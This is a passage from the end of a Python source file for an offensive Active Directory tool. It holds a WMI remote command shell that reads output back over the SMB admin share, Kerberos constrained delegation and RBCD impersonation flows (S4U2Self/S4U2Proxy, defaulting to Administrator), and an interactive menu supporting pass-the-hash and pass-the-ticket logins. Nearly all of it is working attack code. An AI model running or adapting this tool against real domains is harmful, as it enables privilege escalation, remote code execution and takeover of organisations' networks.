        if cmd_in.lower() in ("exit", "quit", "q"):
            print(Fore.YELLOW + "[*] Closing shell..." + Style.RESET_ALL)
            break

        full_cmd = (
            "cmd.exe /Q /v:on /c "
            '(cd /d "' + cwd + '" && ' + cmd_in + ' & echo __CWD_S__!CD!__CWD_E__) '
            '1> ' + out_unc + ' 2>&1'
        )

        try:
            win32Process.Create(full_cmd, "C:\\", None)
        except Exception as e:
            print(Fore.RED + f"[-] Execution error: {e}" + Style.RESET_ALL)
            continue

        try:
            time.sleep(1.5)
        except KeyboardInterrupt:
            print(Fore.YELLOW + "[*] Command interrupted (output may be incomplete)" + Style.RESET_ALL)
            continue

        try:
            buf = []
            smb.getFile("C$", out_file, lambda d: buf.append(d))
            raw = b"".join(buf).decode("utf-8", errors="replace")

            cwd_match = re.search(r"__CWD_S__(.+?)__CWD_E__", raw)
            if cwd_match:
                cwd = cwd_match.group(1).strip()
                out = re.sub(r"__CWD_S__.+?__CWD_E__", "", raw).strip()
            else:
                out = raw.strip()

            print(f"\n{out}\n" if out else "")

            try:
                smb.deleteFile("C$", out_file)
            except:
                pass

        except KeyboardInterrupt:
            print(Fore.YELLOW + "[*] Read interrupted" + Style.RESET_ALL)
            continue
        except Exception as e:
            print(Fore.RED + f"[-] Output read error: {e}" + Style.RESET_ALL)

    _cleanup()


# ─────────────────────────────────────────────────────────────────────────────
# FLOW FUNCTIONS
# ─────────────────────────────────────────────────────────────────────────────
def flow_constrained(args, password, nt_hash):
    print(Fore.MAGENTA + "\n[ CONSTRAINED DELEGATION FLOW ]" + Style.RESET_ALL)
    print(f"  Service account:  {args.username}")
    print(f"  Impersonating:    {args.impersonate}")
    print(f"  Target SPN:       {args.target_spn}")

    # Step 1: Get TGT
    tgt, cipher, old_sk, sk = get_tgt(args.username, args.domain, args.dc, password, nt_hash)

    # Step 2: S4U2Self
    tgs_self_raw = manual_s4u2self(args.username, args.domain, args.dc, args.impersonate, tgt, cipher, sk)
    if not tgs_self_raw:
        print(Fore.RED + "[-] S4U2Self failed, aborting." + Style.RESET_ALL)
        return

    # Step 3: S4U2Proxy
    tgs_proxy_raw = manual_s4u2proxy(args.username, args.domain, args.dc, args.target_spn, args.impersonate, tgs_self_raw, tgt, cipher, sk)
    if not tgs_proxy_raw:
        print(Fore.RED + "[-] S4U2Proxy failed, aborting." + Style.RESET_ALL)
        return

    # Step 4: Save ticket
    ccache = save_ticket(tgs_proxy_raw, args.domain, args.target_spn, args.impersonate)

    # Offer WMI shell
    try:
        shell_ans = get_input(
            Fore.CYAN + f"\n[?] Open interactive WMI shell as {args.impersonate} now? (y/n) [n]: " + Style.RESET_ALL,
            allow_empty=True, default="n"
        )
        if shell_ans.lower() in ("y", "yes"):
            _launch_wmi_shell_with_ccache(args, ccache)
    except KeyboardInterrupt:
        pass


def flow_rbcd(args, password, nt_hash):
    print(Fore.MAGENTA + "\n[ RBCD FLOW ]" + Style.RESET_ALL)
    print(f"  Our account:      {args.username}")
    print(f"  Impersonating:    {args.impersonate}")
    print(f"  Target computer:  {args.target_computer}")
    print(f"  Target SPN:       {args.target_spn}")

    if args.setup_rbcd:
        if not args.attacker_sid:
            print(Fore.RED + "[!] Attacker SID required for RBCD setup" + Style.RESET_ALL)
            sys.exit(1)
        ok = rbcd_setup(
            args.dc, args.domain, args.username, password,
            args.target_computer, args.attacker_sid, nt_hash
        )
        if not ok:
            sys.exit(1)

    # Step 1: Get TGT
    tgt, cipher, old_sk, sk = get_tgt(args.username, args.domain, args.dc, password, nt_hash)

    # Step 2: S4U2Self
    tgs_self_raw = manual_s4u2self(args.username, args.domain, args.dc, args.impersonate, tgt, cipher, sk)
    if not tgs_self_raw:
        print(Fore.RED + "[-] S4U2Self failed, aborting." + Style.RESET_ALL)
        return

    # Step 3: S4U2Proxy
    tgs_proxy_raw = manual_s4u2proxy(args.username, args.domain, args.dc, args.target_spn, args.impersonate, tgs_self_raw, tgt, cipher, sk)
    if not tgs_proxy_raw:
        print(Fore.RED + "[-] S4U2Proxy failed, aborting." + Style.RESET_ALL)
        return

    # Step 4: Save ticket
    ccache = save_ticket(tgs_proxy_raw, args.domain, args.target_spn, args.impersonate)

    # Offer WMI shell
    try:
        shell_ans = get_input(
            Fore.CYAN + f"\n[?] Open interactive WMI shell as {args.impersonate} now? (y/n) [n]: " + Style.RESET_ALL,
            allow_empty=True, default="n"
        )
        if shell_ans.lower() in ("y", "yes"):
            _launch_wmi_shell_with_ccache(args, ccache)
    except KeyboardInterrupt:
        pass


# ─────────────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────────────
if __name__ == '__main__':
    banner()

    # DC IP
    dc_ip = get_input(
        Fore.CYAN + "[?] Enter DC IP Address  : " + Style.RESET_ALL,
        validate_ip, "Invalid IP! Example: 192.168.x.x"
    )
    print(Fore.BLUE + "[*] Checking DC reachability..." + Style.RESET_ALL)
    if not check_ip_reachable(dc_ip):
        print(Fore.RED + f"[!] Cannot reach {dc_ip}!" + Style.RESET_ALL)
        sys.exit(1)
    print(Fore.GREEN + f"[+] DC {dc_ip} is reachable!" + Style.RESET_ALL)

    # Domain
    domain = get_input(
        Fore.CYAN + "[?] Enter Domain Name    : " + Style.RESET_ALL,
        validate_domain, "Invalid domain! Example: domain.com"
    )

    # Auth type selection
    print(Fore.CYAN + "\n[?] Choose authentication type:" + Style.RESET_ALL)
    print(Fore.WHITE + "    1. Password")
    print(Fore.WHITE + "    2. Pass-the-Hash (NTLM)")
    print(Fore.WHITE + "    3. Pass-the-Ticket (Kerberos)")

    auth_choice = get_input(
        Fore.CYAN + "[?] Your choice          : " + Style.RESET_ALL,
        lambda x: x in ['1', '2', '3'],
        "Invalid choice! Enter 1, 2 or 3"
    )

    auth_type = 'password'
    lmhash = ''
    nthash = ''
    ticket_file = ''
    password = ''

    if auth_choice == '1':
        auth_type = 'password'
        username = get_input(Fore.CYAN + "[?] Enter Username       : " + Style.RESET_ALL)
        password = get_input(Fore.CYAN + "[?] Enter Password       : " + Style.RESET_ALL, secret=True)
    elif auth_choice == '2':
        auth_type = 'hash'
        username = get_input(Fore.CYAN + "[?] Enter Username       : " + Style.RESET_ALL)
        hash_input = get_input(
            Fore.CYAN + "[?] Enter NTLM Hash (LM:NT or NT) : " + Style.RESET_ALL,
            validate_hash, "Invalid hash! Format: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
        )
        if ':' in hash_input:
            lmhash, nthash = hash_input.split(':')
        else:
            lmhash = 'aad3b435b51404eeaad3b435b51404ee'
            nthash = hash_input
        lmhash = lmhash.lower()
        nthash = nthash.lower()
    elif auth_choice == '3':
        auth_type = 'ticket'
        username = get_input(Fore.CYAN + "[?] Enter Username       : " + Style.RESET_ALL)
        ticket_file = get_input(Fore.CYAN + "[?] Enter Ticket File Path (ccache) : " + Style.RESET_ALL)
        if not os.path.exists(ticket_file):
            print(Fore.RED + f"[!] Ticket file not found: {ticket_file}" + Style.RESET_ALL)
            sys.exit(1)

    # Verify credentials
    print(Fore.BLUE + "[*] Verifying credentials and domain..." + Style.RESET_ALL)
    result = check_credentials_and_domain(dc_ip, domain, username, password, auth_type, lmhash, nthash, ticket_file)
    if result == "invalid_credentials":
        print(Fore.RED + "[!] Invalid credentials!" + Style.RESET_ALL)
        sys.exit(1)
    elif not result:
        print(Fore.RED + f"[!] Domain '{domain}' not found!" + Style.RESET_ALL)
        sys.exit(1)
    print(Fore.GREEN + "[+] Credentials verified!" + Style.RESET_ALL)
    print(Fore.GREEN + f"[+] Domain '{domain}' verified!" + Style.RESET_ALL)

    # Mode selection
    print(Fore.CYAN + "\n[?] Choose attack mode:" + Style.RESET_ALL)
    print(Fore.WHITE + "    1. Enumerate delegation accounts (recon)")
    print(Fore.WHITE + "    2. Constrained Delegation attack")
    print(Fore.WHITE + "    3. Resource-Based Constrained Delegation (RBCD) attack")

    mode_choice = get_input(
        Fore.CYAN + "[?] Your choice          : " + Style.RESET_ALL,
        lambda x: x in ['1', '2', '3'],
        "Invalid choice! Enter 1, 2 or 3"
    )

    # Build args namespace
    import types
    args = types.SimpleNamespace()
    args.dc = dc_ip
    args.domain = domain
    args.username = username
    args.nt_hash = nthash
    args.impersonate = "Administrator"
    args.target_spn = ""
    args.target_computer = ""
    args.setup_rbcd = False
    args.attacker_sid = ""

    if mode_choice == '1':
        ldap_enum_delegation(dc_ip, domain, username, password, nthash)

    elif mode_choice == '2':
        args.impersonate = get_input(
            Fore.CYAN + "[?] User to impersonate [default: Administrator]: " + Style.RESET_ALL,
            allow_empty=True, default="Administrator"
        )
        args.target_spn = get_input(
            Fore.CYAN + "[?] Target SPN (e.g. cifs/DC.domain.com): " + Style.RESET_ALL
        )
        if not args.target_spn:
            print(Fore.RED + "[!] Target SPN is required" + Style.RESET_ALL)
            sys.exit(1)

        print(f"\n{Fore.GREEN}{'-'*52}")
        print(f"  Mode:        Constrained Delegation")
        print(f"  Domain:      {domain}")
        print(f"  DC IP:       {dc_ip}")
        print(f"  Username:    {username}")
        print(f"  Auth:        {'NT Hash' if nthash else 'Password'}")
        print(f"  Impersonate: {args.impersonate}")
        print(f"  Target SPN:  {args.target_spn}")
        print(f"{'-'*52}{Style.RESET_ALL}\n")

        confirm = get_input(
            Fore.CYAN + "[?] Proceed? (y/n) [y]: " + Style.RESET_ALL,
            allow_empty=True, default="y"
        )
        if confirm.lower() != 'y':
            print(Fore.YELLOW + "[!] Aborted." + Style.RESET_ALL)
            sys.exit(0)

        flow_constrained(args, password, nthash)

    elif mode_choice == '3':
        args.impersonate = get_input(
            Fore.CYAN + "[?] User to impersonate [default: Administrator]: " + Style.RESET_ALL,
            allow_empty=True, default="Administrator"
        )
        args.target_computer = get_input(
            Fore.CYAN + "[?] Target computer name (e.g. WIN-PC01): " + Style.RESET_ALL
        )
        if not args.target_computer:
            print(Fore.RED + "[!] Target computer is required for RBCD" + Style.RESET_ALL)
            sys.exit(1)

        args.target_spn = get_input(
            Fore.CYAN + "[?] Target SPN (e.g. cifs/WIN-PC01.domain.com): " + Style.RESET_ALL
        )
        if not args.target_spn:
            print(Fore.RED + "[!] Target SPN is required" + Style.RESET_ALL)
            sys.exit(1)

        print(Fore.CYAN + "\n[?] RBCD Setup:" + Style.RESET_ALL)
        print(Fore.YELLOW + "  If you have WRITE access to the target computer object," + Style.RESET_ALL)
        print(Fore.YELLOW + "  the script can write the delegation attribute for you." + Style.RESET_ALL)

        setup = get_input(
            Fore.CYAN + "[?] Write RBCD attribute now? (y/n) [n]: " + Style.RESET_ALL,
            allow_empty=True, default="n"
        )
        args.setup_rbcd = setup.lower() == 'y'

        if args.setup_rbcd:
            args.attacker_sid = get_input(
                Fore.CYAN + "[?] Your account SID (S-1-5-21-...): " + Style.RESET_ALL,
                validate_sid, "Invalid SID format! Example: S-1-5-21-1234567890-1234567890-1234567890-1234"
            )

        print(f"\n{Fore.GREEN}{'-'*52}")
        print(f"  Mode:        RBCD")
        print(f"  Domain:      {domain}")
        print(f"  DC IP:       {dc_ip}")
        print(f"  Username:    {username}")
        print(f"  Auth:        {'NT Hash' if nthash else 'Password'}")
        print(f"  Impersonate: {args.impersonate}")
        print(f"  Target SPN:  {args.target_spn}")
        print(f"  Target PC:   {args.target_computer}")
        print(f"  Setup RBCD:  {args.setup_rbcd}")
        print(f"{'-'*52}{Style.RESET_ALL}\n")

        confirm = get_input(
            Fore.CYAN + "[?] Proceed? (y/n) [y]: " + Style.RESET_ALL,
            allow_empty=True, default="y"
        )
        if confirm.lower() != 'y':
            print(Fore.YELLOW + "[!] Aborted." + Style.RESET_ALL)
            sys.exit(0)

        flow_rbcd(args, password, nthash)

    print(Fore.GREEN + "\n[+] Done!" + Style.RESET_ALL)
